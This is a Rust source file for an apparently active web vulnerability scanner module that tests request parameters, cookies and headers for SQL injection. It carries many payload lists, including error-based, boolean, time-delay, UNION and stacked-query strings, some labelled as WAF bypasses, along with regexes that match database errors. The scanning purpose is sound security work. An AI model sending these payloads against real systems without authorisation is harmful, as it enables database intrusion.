use crate::core::config::AppConfig;
use crate::global::config::CoreConfig;
use crate::handler::scan::proxy::{HttpRequest, HttpResponse};
use crate::handler::scan::engine::ScanResult;
use crate::handler::scan::scanners::Scanner;
use anyhow::Result;
use log::error;
use regex::Regex;
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;
use reqwest::Client;
use url::Url;
use async_trait::async_trait;

/// SQL注入扫描器
#[derive(Clone)]
pub struct SqlInjectionScanner {
    /// 配置
    _config: Arc<AppConfig>,
    /// SQL错误模式
    error_patterns: Vec<Regex>,
    /// SQL注入测试载荷
    payloads: HashMap<String, Vec<String>>,
    /// 基准响应时间
    _baseline_response_time: Option<f64>,
}

impl SqlInjectionScanner {
    /// 创建新的SQL注入扫描器
    pub fn new(_config: Arc<AppConfig>) -> Self {
        // 初始化SQL错误模式
        let mut error_patterns = Vec::new();
        
        // MySQL错误 - 使用不常见的错误模式
        error_patterns.push(Regex::new(r"(?i)SQL syntax.*MariaDB").unwrap());
        error_patterns.push(Regex::new(r"(?i)XPATH syntax error").unwrap());
        error_patterns.push(Regex::new(r"(?i)SQL syntax.*MariaDB").unwrap());
        error_patterns.push(Regex::new(r"(?i)Percona Server").unwrap());
        error_patterns.push(Regex::new(r"(?i)MySQLTransactionRollbackException").unwrap());
        error_patterns.push(Regex::new(r"(?i)Deadlock found when trying to get lock").unwrap());
        
        // SQL Server错误 - 使用不常见的错误模式
        error_patterns.push(Regex::new(r"(?i)Microsoft SQL Native Client error").unwrap());
        error_patterns.push(Regex::new(r"(?i)SQLServerException").unwrap());
        error_patterns.push(Regex::new(r"(?i)Msg \d+, Level \d+, State \d+").unwrap());
        error_patterns.push(Regex::new(r"(?i)ODBC SQL Server Driver").unwrap());
        
        // Oracle错误 - 使用不常见的错误模式
        error_patterns.push(Regex::new(r"(?i)ORA-\d+:").unwrap());
        error_patterns.push(Regex::new(r"(?i)Oracle error").unwrap());
        error_patterns.push(Regex::new(r"(?i)TNS:").unwrap());
        error_patterns.push(Regex::new(r"(?i)PLS-\d+").unwrap());
        
        // 通用SQL错误 - 使用不常见的错误模式
        error_patterns.push(Regex::new(r"(?i)Invalid object name").unwrap());
        error_patterns.push(Regex::new(r"(?i)Invalid column name").unwrap());
        error_patterns.push(Regex::new(r"(?i)Data truncation").unwrap());
        error_patterns.push(Regex::new(r"(?i)Unknown column").unwrap());
        error_patterns.push(Regex::new(r"(?i)Conversion failed").unwrap());
        error_patterns.push(Regex::new(r"(?i)SQL syntax").unwrap());

        
        
        // 初始化SQL注入测试载荷
        let mut payloads = HashMap::new();
        
        // 错误型SQL注入载荷 - 使用不常见的WAF绕过技术
        let mut error_payloads = Vec::new();
        // MySQL绕过载荷
        error_payloads.push("%27".to_string()); // 反引号绕过
        error_payloads.push("/*!50000%27*/".to_string()); // MySQL版本注释绕过
        error_payloads.push("%C0%27".to_string()); // UTF-8编码绕过
        error_payloads.push("`%27".to_string()); // 反引号绕过
        error_payloads.push("%%27".to_string()); // 双编码绕过
        error_payloads.push("extractvalue(1,concat(char(126),md5(1326050426)))".to_string()); // 双编码绕过
        error_payloads.push("\"and/**/extractvalue(1,concat(char(126),md5(1470251093)))and\"".to_string()); // 双编码绕过
        error_payloads.push("'and/**/extractvalue(1,concat(char(126),md5(1372378294)))and'".to_string()); // 双编码绕过

        
        // SQL Server绕过载荷
        error_payloads.push("%u0027".to_string()); // Unicode编码绕过
        error_payloads.push("%U0027".to_string()); // 大写Unicode编码绕过
        error_payloads.push(";begin".to_string()); // 存储过程注入
        error_payloads.push("/*|*/".to_string()); // 条件注释绕过
        
        // Oracle绕过载荷
        error_payloads.push("CHR(39)".to_string()); // 字符函数绕过
        error_payloads.push("UNISTR(%27)".to_string()); // Unicode字符串绕过
        error_payloads.push("ASCIISTR(%27)".to_string()); // ASCII字符串绕过
        error_payloads.push("q'[']'".to_string()); // Oracle引号绕过
        
        // 布尔型SQL注入载荷 - 使用不常见的条件语句
        let mut boolean_payloads = Vec::new();
        
        // 整型布尔注入载荷
        boolean_payloads.push("/**/and/**/1=1".to_string());  // true
        boolean_payloads.push("/**/and/**/1=2".to_string());  // false
        boolean_payloads.push("+and+1=1".to_string());        // true
        boolean_payloads.push("+and+1=2".to_string());        // false
        boolean_payloads.push("/**/and/**/true".to_string()); // true
        boolean_payloads.push("/**/and/**/false".to_string());// false
        
        // 字符型布尔注入载荷
        boolean_payloads.push("'/**/and/**/'1'='1".to_string());  // true
        boolean_payloads.push("'/**/and/**/'1'='2".to_string());  // false
        boolean_payloads.push("\"+and+\"1\"=\"1".to_string());    // true
        boolean_payloads.push("\"+and+\"1\"=\"2".to_string());    // false
        boolean_payloads.push("'+and+'1'='1".to_string());        // true
        boolean_payloads.push("'+and+'1'='2".to_string());        // false

        // MySQL特有布尔注入载荷
        boolean_payloads.push("/**/and/**/length(user())>0".to_string());  // true
        boolean_payloads.push("/**/and/**/length(user())<0".to_string());  // false
        boolean_payloads.push("'+and+length(user())>0+'".to_string());     // true
        boolean_payloads.push("'+and+length(user())<0+'".to_string());     // false
        
        // SQL Server特有布尔注入载荷
        boolean_payloads.push("/**/and/**/exists(select*from/**/users)".to_string());    // true
        boolean_payloads.push("/**/and/**/not/**/exists(select*from/**/users)".to_string()); // false
        boolean_payloads.push("'+and+exists(select*from+users)+'".to_string());          // true
        boolean_payloads.push("'+and+not+exists(select*from+users)+'".to_string());      // false

        // Oracle特有布尔注入载荷
        boolean_payloads.push("/**/and/**/rownum=1".to_string());  // true
        boolean_payloads.push("/**/and/**/rownum=0".to_string());  // false
        boolean_payloads.push("'+and+rownum=1+'".to_string());     // true
        boolean_payloads.push("'+and+rownum=0+'".to_string());     // false
        
        // 时间型SQL注入载荷 - 使用不常见的延时函数
        let mut time_payloads = Vec::new();
        
        // MySQL时间型载荷 - 单引号闭合
        time_payloads.push("'+/*!50000BENCHMARK(5000000,MD5(1))*/+'".to_string());
        time_payloads.push("'+/*!50000SLEEP*//*!50000(5)*/+'".to_string());
        time_payloads.push("'+SELECT/**/BENCHMARK(5000000,MD5(1))+'".to_string());
        time_payloads.push("'+IF(1=1,BENCHMARK(5000000,MD5(1)),0)+'".to_string());
        
        // MySQL时间型载荷 - 双引号闭合
        time_payloads.push("\"+/*!50000BENCHMARK(5000000,MD5(1))*/+\"".to_string());
        time_payloads.push("\"+/*!50000SLEEP*//*!50000(5)*/+\"".to_string());
        time_payloads.push("\"+SELECT/**/BENCHMARK(5000000,MD5(1))+\"".to_string());
        time_payloads.push("\"+IF(1=1,BENCHMARK(5000000,MD5(1)),0)+\"".to_string());
        
        // MySQL时间型载荷 - 无需闭合(数字型)
        time_payloads.push("/**/and/**/BENCHMARK(5000000,MD5(1))".to_string());
        time_payloads.push("/**/and/**/SLEEP(5)".to_string());
        time_payloads.push("/**/and/**/IF(1=1,BENCHMARK(5000000,MD5(1)),0)".to_string());
        
        // MySQL时间型载荷 - 括号闭合
        time_payloads.push(")+/*!50000BENCHMARK(5000000,MD5(1))*/+(".to_string());
        time_payloads.push(")+/*!50000SLEEP*//*!50000(5)*/+(".to_string());
        time_payloads.push(")+SELECT/**/BENCHMARK(5000000,MD5(1))+(".to_string());
        
        // SQL Server时间型载荷 - 单引号闭合
        time_payloads.push("';WAITFOR DELAY'0:0:5';--".to_string());
        time_payloads.push("';BEGIN WAIT FOR DELAY'0:0:5'END--".to_string());
        time_payloads.push("';IF 1=1 WAITFOR DELAY'0:0:5'--".to_string());
        time_payloads.push("';EXECUTE sp_getapplock 'x',default,5000--".to_string());
        
        // SQL Server时间型载荷 - 双引号闭合
        time_payloads.push("\";WAITFOR DELAY'0:0:5';--".to_string());
        time_payloads.push("\";BEGIN WAIT FOR DELAY'0:0:5'END--".to_string());
        time_payloads.push("\";IF 1=1 WAITFOR DELAY'0:0:5'--".to_string());
        
        // SQL Server时间型载荷 - 无需闭合(数字型)
        time_payloads.push(";WAITFOR DELAY'0:0:5'--".to_string());
        time_payloads.push(";IF 1=1 WAITFOR DELAY'0:0:5'--".to_string());
        
        // SQL Server时间型载荷 - 括号闭合
        time_payloads.push(");WAITFOR DELAY'0:0:5';--".to_string());
        time_payloads.push(");BEGIN WAIT FOR DELAY'0:0:5'END--".to_string());
        
        // Oracle时间型载荷 - 单引号闭合
        time_payloads.push("'+DBMS_PIPE.RECEIVE_MESSAGE('a',5)+'".to_string());
        time_payloads.push("'+DBMS_LOCK.SLEEP(5)+'".to_string());
        time_payloads.push("'+DBMS_SESSION.SLEEP(5)+'".to_string());
        time_payloads.push("'+UTL_INADDR.GET_HOST_NAME('10.0.0.1')+'".to_string());
        
        // Oracle时间型载荷 - 双引号闭合
        time_payloads.push("\"+DBMS_PIPE.RECEIVE_MESSAGE('a',5)+\"".to_string());
        time_payloads.push("\"+DBMS_LOCK.SLEEP(5)+\"".to_string());
        time_payloads.push("\"+DBMS_SESSION.SLEEP(5)+\"".to_string());
        
        // Oracle时间型载荷 - 无需闭合(数字型)
        time_payloads.push("/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('a',5)".to_string());
        time_payloads.push("/**/and/**/DBMS_LOCK.SLEEP(5)".to_string());
        time_payloads.push("/**/and/**/DBMS_SESSION.SLEEP(5)".to_string());
        
        // Oracle时间型载荷 - 括号闭合
        time_payloads.push(")+DBMS_PIPE.RECEIVE_MESSAGE('a',5)+(".to_string());
        time_payloads.push(")+DBMS_LOCK.SLEEP(5)+(".to_string());
        time_payloads.push(")+DBMS_SESSION.SLEEP(5)+(".to_string());
        
        payloads.insert("error".to_string(), error_payloads);
        payloads.insert("boolean".to_string(), boolean_payloads);
        payloads.insert("time".to_string(), time_payloads);
        
        Self {
            _config,
            error_patterns,
            payloads,
            _baseline_response_time: None,
        }
    }
    
    /// 检查响应中是否包含SQL错误
    fn check_sql_error(&self, body: &[u8]) -> Option<String> {
        // 使用安全的方式将二进制数据转换为字符串
        let body_str = match String::from_utf8(body.to_vec()) {
            Ok(s) => s,
            Err(_) => {
                // 如果不是有效的UTF-8，则使用替代转换方法
                String::from_utf8_lossy(body).to_string()
            }
        };
        
        for pattern in &self.error_patterns {
            if let Some(captures) = pattern.captures(&body_str) {
                if let Some(m) = captures.get(0) {
                    return Some(m.as_str().to_string());
                }
            }
        }
        None
    }
    
    /// 检查SQL语法是否有效
    #[allow(dead_code)]
    fn check_sql_syntax(&self, sql: &str) -> bool {
        let dialect = GenericDialect {};
        let result = Parser::parse_sql(&dialect, sql);
        result.is_ok()
    }
    
    /// 获取当前检测级别的载荷
    fn get_payloads_for_level(&self, level: &str) -> Vec<String> {
        let mut result = Vec::new();
        
        // 错误型SQL注入载荷对所有级别都有效
        if let Some(payloads) = self.payloads.get("error") {
            result.extend(payloads.clone());
        }
        
        // 中高级别添加布尔型SQL注入载荷
        if level == "medium" || level == "high" {
            if let Some(payloads) = self.payloads.get("boolean") {
                result.extend(payloads.clone());
            }
        }
        
        // 高级别添加时间型SQL注入载荷
        if level == "high" {
            if let Some(payloads) = self.payloads.get("time") {
                result.extend(payloads.clone());
            }
        }
        
        result
    }
    
    /// 从URL中提取参数
    #[allow(dead_code)]
    fn extract_params_from_url(&self, url: &str) -> Vec<(String, String)> {
        let mut params = Vec::new();
        
        if let Some(query_string) = url.split('?').nth(1) {
            for pair in query_string.split('&') {
                let mut parts = pair.split('=');
                if let (Some(key), Some(value)) = (parts.next(), parts.next()) {
                    params.push((key.to_string(), value.to_string()));
                }
            }
        }
        
        params
    }
    
    /// 发送测试请求并获取响应
    async fn send_request(&self, request: &HttpRequest) -> Result<HttpResponse> {
        //使用全局的reqwest客户端
        let client = match CoreConfig::global() {
            Ok(config) => config.http_client.clone().unwrap_or(Client::new()),
            Err(e) => {
                error!("获取全局配置失败: {}", e);
                Client::new()
            }
        };
        
        // 构建URL（包含查询参数）
        let mut url = Url::parse(&request.url)?;
        
        // 清除现有的查询参数
        url.set_query(None);
        
        // 使用HashMap来确保每个参数只有一个值
        let mut params_map: std::collections::HashMap<String, String> = HashMap::new();
        for (key, value) in &request.params {
            params_map.insert(key.clone(), value.clone());
        }
        
        // 重新添加所有参数
        {
            let mut query_pairs = url.query_pairs_mut();
            for (key, value) in params_map {
                query_pairs.append_pair(&key, &value);
            }
            // 确保query_pairs在这个作用域结束时被释放
        }
        
        // 构建请求
        let mut req_builder = match request.method.as_str() {
            "GET" => client.get(url),
            "POST" => client.post(url),
            _ => client.get(url), // 默认使用GET
        };
        
        // 添加请求头
        for (key, value) in &request.headers {
            req_builder = req_builder.header(key, value);
        }
        
        // 如果是POST请求，添加请求体
        if request.method == "POST" {
            req_builder = req_builder.body(request.body.clone());
        }
        
        // 发送请求并获取响应
        let resp = req_builder.send().await?;
        let status = resp.status().as_u16();
        let headers = resp.headers()
            .iter()
            .map(|(k, v)| (k.as_str().to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = resp.bytes().await?.to_vec();
        
        Ok(HttpResponse {
            status,
            headers,
            body,
        })
    }
    
    /// 检测错误型SQL注入
    #[allow(dead_code)]
    async fn detect_error_injection(&self, request: &HttpRequest, response: &HttpResponse, param_name: &str, param_value: &str) -> Option<ScanResult> {
        let error_payloads = self.payloads.get("error").unwrap();
        
        // 使用安全的方式转换字符串
        let original_content_result = String::from_utf8(response.body.clone());
        let original_content = match original_content_result {
            Ok(s) => s,
            Err(_) => return None, // 如果原始响应不是有效的UTF-8，跳过该检测
        };
        
        // 对每个错误注入payload进行测试
        for payload in error_payloads {
            // 构造测试请求，替换对应参数的值
            let mut test_request = request.clone();
            test_request.params = test_request.params
                .into_iter()
                .map(|(k, v)| {
                    if k == param_name {
                        (k, payload.clone())
                    } else {
                        (k, v)
                    }
                })
                .collect();
            
            // 发送测试请求并分析响应
            if let Ok(test_response) = self.send_request(&test_request).await {
                // 使用安全的方式转换字符串
                let test_content = match String::from_utf8(test_response.body.clone()) {
                    Ok(s) => s,
                    Err(_) => continue, // 如果payload响应不是有效的UTF-8，跳过该响应
                };
                
                // 检查响应中是否包含SQL错误
                if let Some(error) = self.check_sql_error(&test_response.body) {
                    // 检查响应是否与原始响应不同
                    if test_content != original_content {
                        let db_type = self.identify_database_type(&error);
                        return Some(ScanResult {
                            vulnerability_type: "SQL Injection".to_string(),
                            name: "错误型SQL注入漏洞".to_string(),
                            description: format!("检测到{}数据库的SQL注入漏洞，响应中包含数据库错误信息", db_type),
                            risk_level: "High".to_string(),
                            url: request.url.to_string(),
                            method: request.method.to_string(),
                            parameter: Some(param_name.to_string()),
                            value: Some(payload.clone()),
                            evidence: Some(error.clone()),
                            remediation: Some("使用参数化查询，避免直接拼接SQL语句，对用户输入进行严格过滤".to_string()),
                            details: Some(format!("参数 {} 注入payload {} 导致{}数据库错误: {}", 
                                param_name, payload, db_type, error)),
                            timestamp: chrono::Utc::now(),
                            request_details: Some(format!("{} {}\nHost: {}", request.method, request.url, request.url.split('/').nth(2).unwrap_or("unknown"))),
                            response_details: Some(format!("响应体大小: {} 字节\n内容预览: {}", test_response.body.len(), match String::from_utf8(test_response.body[..std::cmp::min(200, test_response.body.len())].to_vec()) {
                                Ok(s) => s,
                                Err(_) => "[无法显示非UTF-8内容]".to_string(),
                            }))
                        });
                    }
                }
            }
        }
        
        None
    }
    
    /// 检测布尔型SQL注入
    #[allow(dead_code)]
    async fn detect_boolean_injection(&self, request: &HttpRequest, original_response: &HttpResponse, param_name: &str, param_value: &str) -> Option<ScanResult> {
        let payloads = self.payloads.get("boolean").unwrap();
        
        // 使用安全的方式转换原始响应
        let original_content = match String::from_utf8(original_response.body.clone()) {
            Ok(s) => s,
            Err(_) => return None, // 如果不是有效的UTF-8，跳过该检测
        };
        
        for payload in payloads {
            // 构造真条件测试请求，保留原始参数值并附加payload
            let mut true_request = request.clone();
            true_request.params = true_request.params
                .into_iter()
                .map(|(k, v)| {
                    if k == param_name {
                        (k, format!("{}{}", v, payload.replace("1=1", "1=1")))
                    } else {
                        (k, v)
                    }
                })
                .collect();
            
            // 构造假条件测试请求，保留原始参数值并附加payload
            let mut false_request = request.clone();
            false_request.params = false_request.params
                .into_iter()
                .map(|(k, v)| {
                    if k == param_name {
                        (k, format!("{}{}", v, payload.replace("1=1", "1=2")))
                    } else {
                        (k, v)
                    }
                })
                .collect();
            
            // 发送请求并获取响应
            if let (Ok(true_response), Ok(false_response)) = (
                self.send_request(&true_request).await,
                self.send_request(&false_request).await
            ) {
                // 使用安全的方式转换字符串
                let true_content = match String::from_utf8(true_response.body.clone()) {
                    Ok(s) => s,
                    Err(_) => continue, // 如果不是有效的UTF-8，跳过该响应
                };
                
                let false_content = match String::from_utf8(false_response.body.clone()) {
                    Ok(s) => s,
                    Err(_) => continue, // 如果不是有效的UTF-8，跳过该响应
                };
                
                // 如果真假条件返回不同的响应，可能存在布尔型注入
                if true_content != false_content && true_content == original_content {
                    return Some(ScanResult {
                        vulnerability_type: "SQL Injection".to_string(),
                        name: "布尔型SQL注入漏洞".to_string(),
                        description: "检测到布尔型SQL注入漏洞，不同的条件返回不同的响应".to_string(),
                        risk_level: "High".to_string(),
                        url: request.url.to_string(),
                        method: request.method.to_string(),
                        parameter: Some(param_name.to_string()),
                        value: Some(format!("{}{}", param_value, payload)),
                        evidence: Some(format!("真条件({})与假条件({})返回不同响应", "1=1", "1=2")),
                        remediation: Some("使用参数化查询，避免直接拼接SQL语句，对用户输入进行严格过滤".to_string()),
                        details: Some(format!("参数 {} 注入payload {} 导致响应差异", param_name, format!("{}{}", param_value, payload))),
                        timestamp: chrono::Utc::now(),
                        request_details: Some(format!("{} {}\nHost: {}", request.method, request.url, request.url.split('/').nth(2).unwrap_or("unknown"))),
                        response_details: Some("存在布尔型SQL注入漏洞，真/假条件返回不同响应".to_string()),
                    });
                }
            }
        }
        
        None
    }

    /// 检测时间型SQL注入
    #[allow(dead_code)]
    async fn detect_time_injection(&self, request: &HttpRequest, param_name: &str, param_value: &str) -> Option<ScanResult> {
        let payloads = self.payloads.get("time").unwrap();
        
        // 首先发送正常请求获取基准响应时间
        let start = Instant::now();
        if let Ok(_) = self.send_request(request).await {
            let baseline_duration = start.elapsed();
            
            for payload in payloads {
                let start = Instant::now();
                
                // 构造测试请求，替换对应参数的值
                let mut test_request = request.clone();
                test_request.params = test_request.params
                    .into_iter()
                    .map(|(k, v)| {
                        if k == param_name {
                            (k, format!("{}{}", v, payload))
                        } else {
                            (k, v)
                        }
                    })
                    .collect();
                
                // 发送测试请求并测量响应时间
                if let Ok(_) = self.send_request(&test_request).await {
                    let duration = start.elapsed();
                    
                    // 如果响应时间明显大于基准时间（5倍以上），可能存在时间型注入
                    if duration.as_secs_f64() > baseline_duration.as_secs_f64() * 5.0 {
                        return Some(ScanResult {
                            vulnerability_type: "SQL Injection".to_string(),
                            name: "时间型SQL注入漏洞".to_string(),
                            description: "检测到时间型SQL注入漏洞，响应时间异常延迟".to_string(),
                            risk_level: "High".to_string(),
                            url: request.url.to_string(),
                            method: request.method.to_string(),
                            parameter: Some(param_name.to_string()),
                            value: Some(format!("{}{}", param_value, payload)),
                            evidence: Some(format!("基准响应时间: {:?}, 注入后响应时间: {:?}", baseline_duration, duration)),
                            remediation: Some("使用参数化查询，避免直接拼接SQL语句，对用户输入进行严格过滤".to_string()),
                            details: Some(format!("参数 {} 注入payload {} 导致响应延迟", param_name, format!("{}{}", param_value, payload))),
                            timestamp: chrono::Utc::now(),
                            request_details: Some(format!("{} {}\nHost: {}", request.method, request.url, request.url.split('/').nth(2).unwrap_or("unknown"))),
                            response_details: Some(format!("响应包含RCE错误特征: ")),
                        });
                    }
                }
            }
        }
        
        None
    }
    
    /// 检测联合查询注入
    #[allow(dead_code)]
    async fn detect_union_injection(&self, request: &HttpRequest, response: &HttpResponse, param_name: &str, _param_value: &str) -> Option<ScanResult> {
        let union_payloads = vec![
            "/*!50000UnIoN*//*!50000SeLeCt*/1,2,3,4,5--",
            "/*!12345UnIoN*//*!12345sElEcT*/1,2,3,4,5--",
            "+/*!50000%55nIoN*/+/*!50000%53eLeCt*/1,2,3,4,5--",
            "UnIoN/*&a=*/SeLeCt/*&a=*/1,2,3,4,5--",
        ];
        
        // 使用安全的方式转换原始响应
        let original_content = match String::from_utf8(response.body.clone()) {
            Ok(s) => s,
            Err(_) => return None, // 如果不是有效的UTF-8，跳过该检测
        };
        
        for payload in union_payloads {
            // 构造测试请求
            let mut test_request = request.clone();
            test_request.params = test_request.params
                .into_iter()
                .map(|(k, v)| {
                    if k == param_name {
                        (k, format!("{}{}", v, payload))
                    } else {
                        (k, v)
                    }
                })
                .collect();
            
            // 发送测试请求并分析响应
            if let Ok(test_response) = self.send_request(&test_request).await {
                // 使用安全的方式转换字符串
                let test_content = match String::from_utf8(test_response.body.clone()) {
                    Ok(s) => s,
                    Err(_) => continue, // 如果不是有效的UTF-8，跳过该响应
                };
                
                // 检查响应中是否包含注入的数字
                if (1..=5).any(|i| test_content.contains(&i.to_string())) && test_content != original_content {
                    return Some(ScanResult {
                        vulnerability_type: "SQL Injection".to_string(),
                        name: "联合查询SQL注入漏洞".to_string(),
                        description: "检测到联合查询SQL注入漏洞，响应中包含注入的测试数据".to_string(),
                        risk_level: "High".to_string(),
                        url: request.url.to_string(),
                        method: request.method.to_string(),
                        parameter: Some(param_name.to_string()),
                        value: Some(payload.to_string()),
                        evidence: Some("响应中包含联合查询注入的测试数据".to_string()),
                        remediation: Some("使用参数化查询，避免直接拼接SQL语句，对用户输入进行严格过滤".to_string()),
                        details: Some(format!("参数 {} 注入payload {} 成功执行联合查询", param_name, payload)),
                        timestamp: chrono::Utc::now(),
                        request_details: Some(format!("{} {}\nHost: {}", request.method, request.url, request.url.split('/').nth(2).unwrap_or("unknown"))),
                        response_details: Some(format!("响应体大小: {} 字节\n内容预览: {}", test_response.body.len(), match String::from_utf8(test_response.body[..std::cmp::min(200, test_response.body.len())].to_vec()) {
                            Ok(s) => s,
                            Err(_) => "[无法显示非UTF-8内容]".to_string(),
                        }))
                    });
                }
            }
        }
        
        None
    }

    /// 检测堆叠查询注入
    #[allow(dead_code)]
    async fn detect_stacked_injection(&self, request: &HttpRequest, response: &HttpResponse, param_name: &str, _param_value: &str) -> Option<ScanResult> {
        let stacked_payloads = vec![
            ";SELECT @@version--",
            ";SELECT SLEEP(0)--",
            ";SELECT USER()--",
            ";SELECT CURRENT_USER()--",
        ];
        
        // 使用安全的方式转换原始响应
        let original_content = match String::from_utf8(response.body.clone()) {
            Ok(s) => s,
            Err(_) => return None, // 如果不是有效的UTF-8，跳过该检测
        };
        
        for payload in stacked_payloads {
            // 构造测试请求
            let mut test_request = request.clone();
            test_request.params = test_request.params
                .into_iter()
                .map(|(k, v)| {
                    if k == param_name {
                        (k, format!("{}{}", v, payload))
                    } else {
                        (k, v)
                    }
                })
                .collect();
            
            // 发送测试请求并分析响应
            if let Ok(test_response) = self.send_request(&test_request).await {
                // 使用安全的方式转换字符串
                let test_content = match String::from_utf8(test_response.body.clone()) {
                    Ok(s) => s,
                    Err(_) => continue, // 如果不是有效的UTF-8，跳过该响应
                };
                
                // 检查包含数据库信响应中是否息
                if test_content != original_content && 
                   (test_content.contains("Microsoft SQL Server") || 
                    test_content.contains("MySQL") || 
                    test_content.contains("Oracle Database")) {
                    return Some(ScanResult {
                        vulnerability_type: "SQL Injection".to_string(),
                        name: "堆叠查询SQL注入漏洞".to_string(),
                        description: "检测到堆叠查询SQL注入漏洞，成功执行了多条SQL语句".to_string(),
                        risk_level: "High".to_string(),
                        url: request.url.to_string(),
                        method: request.method.to_string(),
                        parameter: Some(param_name.to_string()),
                        value: Some(payload.to_string()),
                        evidence: Some("响应中包含数据库版本信息".to_string()),
                        remediation: Some("使用参数化查询，避免直接拼接SQL语句，对用户输入进行严格过滤".to_string()),
                        details: Some(format!("参数 {} 注入payload {} 成功执行堆叠查询", param_name, payload)),
                        timestamp: chrono::Utc::now(),
                        request_details: Some(format!("{} {}\nHost: {}", request.method, request.url, request.url.split('/').nth(2).unwrap_or("unknown"))),
                        response_details: Some(format!("响应中包含数据库信息，表明堆叠查询成功执行")),
                    });
                }
            }
        }
        
        None
    }

    /// 识别数据库类型
    #[allow(dead_code)]
    fn identify_database_type(&self, error: &str) -> &str {
        if error.contains("MySQL") || error.contains("MariaDB") {
            "MySQL/MariaDB"
        } else if error.contains("SQL Server") || error.contains("Microsoft SQL") {
            "SQL Server"
        } else if error.contains("Oracle") || error.contains("ORA-") {
            "Oracle"
        } else {
            "Unknown"
        }
    }
}

#[async_trait]
impl Scanner for SqlInjectionScanner {
    async fn name(&self) -> String {
        "SQL Injection Scanner".to_string()
    }

    async fn scan(&self, request: &HttpRequest, response: &HttpResponse) -> Vec<ScanResult> {
        let mut results = Vec::new();
        
        // 提取请求参数（URL和表单参数）
        let mut parameters = Vec::new();
        
        // 处理URL参数
        parameters.extend(request.params.clone());
        
        // 处理URL路径参数（REST风格API）
        let url_path_parts: Vec<&str> = request.url.split('?').next().unwrap_or("").split('/').collect();
        for (i, part) in url_path_parts.iter().enumerate() {
            if !part.is_empty() && part.parse::<i64>().is_ok() {
                // 可能是ID参数
                parameters.push((format!("path_param_{}", i), part.to_string()));
            }
        }
        
        // 处理表单参数（如果是POST请求）
        if request.method == "POST" && request.headers.get("Content-Type").map_or(false, |ct| ct.contains("application/x-www-form-urlencoded")) {
            if let Ok(body_str) = String::from_utf8(request.body.clone()) {
                for param_pair in body_str.split('&') {
                    if let Some(idx) = param_pair.find('=') {
                        let (name, value) = param_pair.split_at(idx);
                        let value = &value[1..]; // 移除等号
                        parameters.push((name.to_string(), value.to_string()));
                    }
                }
            }
        }
        
        // 处理JSON参数（如果是POST请求且是JSON格式）
        if request.method == "POST" && request.headers.get("Content-Type").map_or(false, |ct| ct.contains("application/json")) {
            if let Ok(body_str) = String::from_utf8(request.body.clone()) {
                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body_str) {
                    if let Some(obj) = json.as_object() {
                        for (key, value) in obj {
                            if let Some(str_value) = value.as_str() {
                                parameters.push((key.clone(), str_value.to_string()));
                            } else if let Some(num_value) = value.as_i64() {
                                parameters.push((key.clone(), num_value.to_string()));
                            }
                        }
                    }
                }
            }
        }
        
        // 处理Cookie参数
        if let Some(cookie) = request.headers.get("Cookie") {
            for cookie_pair in cookie.split(';') {
                if let Some(idx) = cookie_pair.find('=') {
                    let (name, value) = cookie_pair.split_at(idx);
                    let value = &value[1..]; // 移除等号
                    let name = name.trim();
                    parameters.push((format!("cookie_{}", name), value.to_string()));
                }
            }
        }
        
        // 处理HTTP头部（某些漏洞可能通过头部触发）
        for (name, value) in &request.headers {
            if ["User-Agent", "Referer", "X-Forwarded-For"].contains(&name.as_str()) {
                parameters.push((format!("header_{}", name), value.clone()));
            }
        }
        
        // 对每个参数进行检测
        for (param_name, param_value) in parameters {
            // 跳过空值
            if param_value.is_empty() {
                continue;
            }
            
            // 1. 错误型SQL注入检测
            if let Some(result) = self.detect_error_injection(request, response, &param_name, &param_value).await {
                results.push(result);
                // 如果已经检测到高危漏洞，跳过其他检测以提高性能
                continue;
            }
            
            // 2. 布尔型SQL注入检测
            if let Some(result) = self.detect_boolean_injection(request, response, &param_name, &param_value).await {
                results.push(result);
                continue;
            }
            
            // 3. 时间型SQL注入检测
            if let Some(result) = self.detect_time_injection(request, &param_name, &param_value).await {
                results.push(result);
                continue;
            }
            
            // 4. UNION型SQL注入检测
            if let Some(result) = self.detect_union_injection(request, response, &param_name, &param_value).await {
                results.push(result);
                continue;
            }
            
            // 5. 堆叠查询SQL注入检测
            if let Some(result) = self.detect_stacked_injection(request, response, &param_name, &param_value).await {
                results.push(result);
                continue;
            }
        }
        
        // 返回所有检测到的漏洞结果
        results
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::handler::scan::proxy::{HttpRequest, HttpResponse};
    use crate::core::config::AppConfig;
    use std::sync::Arc;

  
    // 创建测试请求的辅助函数
    fn create_test_request(url: &str, body: Option<Vec<u8>>) -> HttpRequest {
        let mut headers = HashMap::new();
        headers.insert(String::from("Content-Type"), String::from("text/html"));
        headers.insert(String::from("User-Agent"), String::from("Test Agent"));
    
        HttpRequest {
            method: "GET".to_string(),
            url: url.to_string(),
            headers,
            body: body.unwrap_or_default(),
            params: vec![],
        }
    }

    // 创建测试响应的辅助函数
    fn create_test_response(status: u16, body: &str, content_type: &str) -> HttpResponse {
        let mut headers = HashMap::new();
        headers.insert(String::from("Content-Type"), String::from("text/html"));
        headers.insert(String::from("Server"), String::from("Test Server"));
        HttpResponse {
            status,
            headers,
            body: body.as_bytes().to_vec(),
        }
    }

    // Create test app config
    fn create_test_config() -> Arc<AppConfig> {
        Arc::new(AppConfig {
            proxy: crate::core::config::ProxyConfig {
                host: Some("127.0.0.1".to_string()),
                port: Some(8080),
                connect_timeout: 10,
                max_retries: 3,
                retry_delay: 1000,
                ca_cert_path: "".to_string(),
                ca_key_path: "".to_string(),

            },
            scanner: crate::core::config::ScannerConfig {
                mode: "active".to_string(),
                concurrency: 10,
                timeout_ms: 5000,
                save_results: false,
                results_path: "./results.json".to_string(),
            },
            rules: crate::core::config::RulesConfig {
                enable_builtin: true,
                enable_extensions: false,
                extensions_path: "rules/extensions".to_string(),
                vulnerabilities: crate::core::config::VulnerabilitiesConfig {
                    xss: crate::core::config::XssConfig {
                        enabled: true,
                        use_ast: true,
                        max_params: 20,
                        max_depth: 3,
                    },
                    sql_injection: crate::core::config::SqlInjectionConfig {
                        enabled: true,
                        level: "high".to_string(),
                    },
                    rce: crate::core::config::RceConfig {
                        enabled: true,
                        level: "high".to_string(),
                    },
                    path_traversal: crate::core::config::PathTraversalConfig {
                        enabled: true,
                    },
